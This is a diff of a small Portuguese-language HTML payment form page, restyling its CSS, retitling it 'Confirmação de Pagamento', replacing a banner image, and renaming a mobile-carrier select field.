@@ -1,53 +1,48 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Formulário de Captura</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirmação de Pagamento</title>
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
-
     body {
-      background-color: #f2f2f2;
       margin: 0;
       padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       min-height: 100vh;
     }
 
     .container {
-      background-color: #fff;
+      background: white;
       padding: 30px 20px;
       max-width: 400px;
       width: 100%;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: left;
     }
 
     .container img {
       width: 100%;
-      height: auto;
-      border-radius: 8px;
+      border-radius: 10px;
       margin-bottom: 20px;
     }
 
     h2 {
-      font-size: 20px;
-      margin-bottom: 20px;
       text-align: center;
       font-weight: bold;
+      font-size: 20px;
+      margin-bottom: 20px;
     }
 
     label {
+      font-weight: bold;
       display: block;
       margin-bottom: 5px;
-      font-weight: 600;
     }
 
     input, select {
@@ -55,7 +50,7 @@
       padding: 10px;
       margin-bottom: 15px;
       border: 1px solid #ccc;
-      border-radius: 6px;
+      border-radius: 5px;
       font-size: 14px;
     }
 
@@ -63,10 +58,11 @@
       width: 100%;
       padding: 12px;
       background-color: #28a745;
-      color: white;
       border: none;
-      border-radius: 6px;
+      color: white;
       font-size: 16px;
+      font-weight: bold;
+      border-radius: 5px;
       cursor: pointer;
     }
 
@@ -74,16 +70,16 @@
       background-color: #218838;
     }
 
-    @media (max-width: 500px) {
+    @media (max-width: 480px) {
       .container {
-        margin: 10px;
+        margin: 15px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://via.placeholder.com/400x200.png?text=Imagem+de+Destaque" alt="Imagem de destaque">
+    <img src="https://media.graphassets.com/resize=fit:crop,height:400,width:800/output=format:webp/compress/v8Ngrv7uSVyJVqJeW6XQ" alt="Banner">
 
     <h2><strong>Para concluir o pagamento, preencha as informações abaixo.</strong></h2>
 
@@ -97,9 +93,9 @@
       <label for="telefone">Número de Telemóvel:</label>
       <input type="tel" id="telefone" name="telefone" placeholder="Digite seu número" required>
 
-      <label for="rede">Escolha a rede:</label>
-      <select id="rede" name="rede" required>
-        <option value="">Selecione uma opção</option>
+      <label for="operadora">Escolha a rede:</label>
+      <select id="operadora" name="operadora" required>
+        <option value="">Selecione</option>
         <option value="vivo">Vivo</option>
         <option value="claro">Claro</option>
         <option value="tim">TIM</option>
